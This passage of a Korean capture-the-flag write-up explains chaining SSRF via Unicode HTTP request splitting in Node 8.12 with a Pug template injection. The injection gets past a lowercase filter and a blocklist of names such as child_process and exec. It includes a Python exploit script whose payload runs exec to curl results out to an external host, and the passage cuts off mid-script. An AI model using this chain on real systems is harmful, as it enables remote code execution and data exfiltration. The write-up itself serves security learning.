class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">server</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">listen</span><span class=\"mtk1\">(</span><span class=\"mtk7\">8081</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">host</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">server</span><span class=\"mtk1\">.</span><span class=\"mtk3\">address</span><span class=\"mtk1\">().</span><span class=\"mtk4\">address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">port</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">server</span><span class=\"mtk1\">.</span><span class=\"mtk3\">address</span><span class=\"mtk1\">().</span><span class=\"mtk4\">port</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;Example app listening at http://%s:%s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">host</span><span class=\"mtk1\">, </span><span class=\"mtk4\">port</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p>여기서 보면 flag에 접근을 해야 하는데 일단 localhost에서 접근을 해야 하는 것을 볼 수 있습니다.</p>\n<p>이때 <code>req.connection.remoteAddress;</code> 을 통해 받고 있기 때문에 <code>x-forwarded-for</code> 와 같은 헤더로는 공격이 불가능한 것을 확인할 수 있습니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\">//node 8.12.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;/core&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\">(</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">query</span><span class=\"mtk1\">.</span><span class=\"mtk4\">q</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">resp</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">q</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">url</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;http://localhost:8081/getMeme?&#39;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span></span></span></code></pre>\n<p>source에서 보이는 주석에서 알려 주는 nodejs 버전과 /core에서 받아 들이는 q= 파라미터에서 url parse 취약점을 이용하여 ssrf가 가능해 보입니다.</p>\n<blockquote>\n<h4 id=\"참고---http-request-splitting-ssrf-via-request-splitting--유니코드-정보\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EA%B3%A0---http-request-splitting-ssrf-via-request-splitting--%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EC%A0%95%EB%B3%B4\" aria-label=\"참고   http request splitting ssrf via request splitting  유니코드 정보 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://capec.mitre.org/data/definitions/105.html\">참고 - HTTP Request Splitting</a>, <a href=\"https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/\">SSRF via Request Splitting</a> , <a href=\"https://en.wikipedia.org/wiki/List_of_Unicode_characters\">유니코드 정보</a></h4>\n<p>HTTP Request에 double CR/LF characters으로 변환되는 유니코드를 url 포맷에 맞춰 (</p>\n<p>%C4%8D%C4%8A)를 HTTP header에 넣음으로 request을 split! 합니다.</p>\n</blockquote>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">http://27.96.135.144:8081/core?q=test%C4%A0HTTP%2F1.1%C4%8D%C4%8AHOST%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Fflag%C4%A0HTTP%2F1.1%C4%8D%C4%8AHOST%3A%C4%A0127.0.0.1%C4%8D%C4%8Aadminauth%3A%C4%A0secretpassword%C4%8D%C4%8Apug%3A%C4%A0123%C4%8D%C4%8Atest%3A</span></span></code></pre>\n<p>이제 서버에서는 url이 이런 형태로 parse 시켜서 이해 하게 됩니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"http\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">GET /core?q=test HTTP/1.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">HOST: 127.0.0.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">GET /flag HTTP/1.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">HOST: 127.0.0.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">adminauth: secretpassword</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pug: 123</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">test: ~~~~ 원래 전달 되야 하는 request를 test의 헤더로 무시</span></span></code></pre>\n<p>그리고 실제로 서버에서 이런 형태로 로그를 보여 주는 것을 확인 할 수 있습니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAOElEQVQI1zWK2w0AIAgDXYVSQwjuv14VjR+XXB9jVSkilJmX9jkpdxcMAiAnxcN1vL5zfxr+3Uwbccscdb0fqBoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"M9dhQS2RyAkV9kx6VLMEpkimg\"\n        title=\"M9dhQS2RyAkV9kx6VLMEpkimg\"\n        src=\"/static/6cb512b59a8a516583617a2e38d1c8f3/c1b63/M9dhQS2RyAkV9kx6VLMEpkimg.png\"\n        srcset=\"/static/6cb512b59a8a516583617a2e38d1c8f3/5a46d/M9dhQS2RyAkV9kx6VLMEpkimg.png 300w,\n/static/6cb512b59a8a516583617a2e38d1c8f3/0a47e/M9dhQS2RyAkV9kx6VLMEpkimg.png 600w,\n/static/6cb512b59a8a516583617a2e38d1c8f3/c1b63/M9dhQS2RyAkV9kx6VLMEpkimg.png 1200w,\n/static/6cb512b59a8a516583617a2e38d1c8f3/f470a/M9dhQS2RyAkV9kx6VLMEpkimg.png 1443w\"\n        sizes=\"(max-width: 1200px) 100vw, 1200px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>이제 flag 쪽 소스를 분석 합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/flag&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">ip</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">connection</span><span class=\"mtk1\">.</span><span class=\"mtk4\">remoteAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">ip</span><span class=\"mtk1\">.</span><span class=\"mtk3\">includes</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;127.0.0.1&quot;</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;adminauth&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug2</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">decodeURI</span><span class=\"mtk1\">(</span><span class=\"mtk4\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;pug&quot;</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">x</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug2</span><span class=\"mtk1\">.</span><span class=\"mtk3\">match</span><span class=\"mtk1\">(</span><span class=\"mtk6\">/</span><span class=\"mtk7\">[a-z]</span><span class=\"mtk6\">/</span><span class=\"mtk10\">g</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk8\">!</span><span class=\"mtk4\">x</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;secretpassword&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">html</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug</span><span class=\"mtk1\">.</span><span class=\"mtk3\">render</span><span class=\"mtk1\">(</span><span class=\"mtk4\">pug2</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;No characters&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;You need to come from localhost&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p>일단 첫 번째 조건인 접근 IP가 127.0.0.1 이여야 한다는 점 그리고 adminauth: secretpassword 형태의 header가 달려있어야 한다는 두 가지 조건은 해결이 되었습니다.</p>\n<p>이제 pug헤더에 영문이 없어야 하고 이것이 지켜 졌을 때 pug를 이용하여 렌더링을 시켜 주게 되는데 일단 pug가 무엇 인지 찾아 봅니다.</p>\n<blockquote>\n<h1 id=\"code\" style=\"position:relative;\"><a href=\"#code\" aria-label=\"code permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code</h1>\n<p>Pug allows you to write inline JavaScript code in your templates. There are three types of code: Unbuffered, Buffered, and Unescaped Buffered.</p>\n</blockquote>\n<p>javascript와 pug 문법을 이용하여 간결하게 html을 렌더링 하게 도와주는 것으로 보입니다. 이때 js를 이용하여 렌더링 한다는 것을 이용하여 공격을 해봅니다.</p>\n<p>또한 blackList 체크 항목에 있는 <strong>[\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\"\",\"'\",\"!\"]</strong> 을 이용하여 공격을 하면 될 것 같습니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">-[][&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(this.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl http://devjs.cf:8089/cookie.php -X POST -d c=`ls | grep flag` &#39;))&quot;)()</span></span></code></pre>\n<p>대략 이런형태로 내가 원하는 명령어를 보내고 그다음 서버에서 다시한번 처리를 하고 저의 서버로 전송하도록 하였습니다.</p>\n<p>이제 우회를 시키는 스크립트를 작성합니다.</p>\n<p>일단 pug 헤더에 담긴 공격 payload가 영문 소문자가 포함이 되었는지 확인 하는 루틴이 있는데 이것은 8진법으로 변환하여 우회해봅니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">changeOct</span><span class=\"mtk1\">(</span><span class=\"mtk4\">str</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">r</span><span class=\"mtk8\">=</span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">for</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> str:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk8\">&gt;=</span><span class=\"mtk6\">&#39;a&#39;</span><span class=\"mtk4\">and</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk8\">&lt;=</span><span class=\"mtk6\">&#39;z&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk8\">+=</span><span class=\"mtk6\">&#39;</span><span class=\"mtk8\">\\\\</span><span class=\"mtk6\">&#39;</span><span class=\"mtk8\">+</span><span class=\"mtk3\">oct</span><span class=\"mtk1\">(</span><span class=\"mtk3\">ord</span><span class=\"mtk1\">(</span><span class=\"mtk4\">i</span><span class=\"mtk1\">))[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">:]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">else</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk8\">+=</span><span class=\"mtk4\">i</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">r</span></span></span></code></pre>\n<p>그리고 이제 payload 부분을 쉽게 제작 할 수 있도록 우회 문자를 상수로 선언하여 작성합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">SPACE = &quot;Ġ&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">CRLF = &quot;čĊ&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">SLASH = &quot;į&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">payload = &quot;test&quot;+SPACE+&quot;HTTP&quot;+SLASH+&quot;1.1&quot;+CRLF*2+&quot;GET&quot;+SPACE+SLASH+&quot;flag&quot;+SPACE+&quot;HTTP&quot;+SLASH+&quot;1.1&quot;+CRLF+&quot;HOST:&quot;+SPACE+&quot;127.0.0.1&quot;+CRLF+&quot;adminauth:&quot;+SPACE+&quot;secretpassword&quot;+CRLF+&quot;pug:&quot;+SPACE+공격 PUG 값이 들어올 자리+CRLF+&quot;test:&quot;+SPACE</span></span></code></pre>\n<p>이제 이러한 스크립트를 결합하여 일단 현재 경로에 무엇이 있는지 확인 해봅니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk1\"> </span><span class=\"mtk4\">requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">from</span><span class=\"mtk1\"> </span><span class=\"mtk4\">requests</span><span class=\"mtk1\">.</span><span class=\"mtk4\">utils</span><span class=\"mtk1\"> </span><span class=\"mtk4\">import</span><span class=\"mtk1\"> </span><span class=\"mtk4\">quote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">def</span><span class=\"mtk1\"> </span><span class=\"mtk4\">changeOct</span><span class=\"mtk1\">(</span><span class=\"mtk4\">str</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">r</span><span class=\"mtk1\">=</span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">for</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk4\">str</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\">&gt;=</span><span class=\"mtk6\">&#39;a&#39;</span><span class=\"mtk4\">and</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\">&lt;=</span><span class=\"mtk6\">&#39;z&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk1\">+=</span><span class=\"mtk6\">&#39;</span><span class=\"mtk8\">\\\\</span><span class=\"mtk6\">&#39;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">oct</span><span class=\"mtk1\">(</span><span class=\"mtk4\">ord</span><span class=\"mtk1\">(</span><span class=\"mtk4\">i</span><span class=\"mtk1\">))[2:]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">else</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk1\">+=</span><span class=\"mtk4\">i</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">r</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">SPACE</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;Ġ&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">CRLF</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;čĊ&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">SLASH</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;į&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">pug</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">changeOct</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;&#39;&#39;-[][&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(this.process.mainModule.require(&#39;</span><span class=\"mtk4\">child_process</span><span class=\"mtk6\">&#39;).exec(&#39;</span><span class=\"mtk4\">curl</span><span class=\"mtk1\"> </span><span class=\"mtk4\">http</span><span class=\"mtk1\">:</span><span class=\"mtk5 mtki\">//devjs.cf:8089/cookie.php -X POST -d c=`ls | grep flag` &#39;))&quot;)()&#39;&#39;&#39;).replace(&#39;&quot;&#39;,&#39;%22&#39;).replace(&quot;&#39;&quot;,&quot;%27&quot;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">print</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">quote</span><span class=\"mtk1\">(</span><span class=\"mtk4\">pug</span><span class=\"mtk1\">)) #</span><span class=\"mtk4\">url</span><span class=\"mtk1\">-</span><span class=\"mtk4\">encoding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">payload</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;test&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;HTTP&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SLASH</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;1.1&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk7\">*</span><span class=\"mtk1\">2+</span><span class=\"mtk6\">&quot;GET&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SLASH</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;flag&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;HTTP&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SLASH</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;1.1&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;HOST:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;127.0.0.1&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;adminauth:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;secretpassword&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;pug:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk4\">pug</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;test:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">res</span><span class=\"mtk1\">=</span><span class=\"mtk4\">requests</span><span class=\"mtk1\">.</span><span class=\"mtk4\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;http://devjs.cf:8081/core?q=&#39;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">quote</span><span class=\"mtk1\">(</span><span class=\"mtk4\">payload</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">print</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">res</span><span 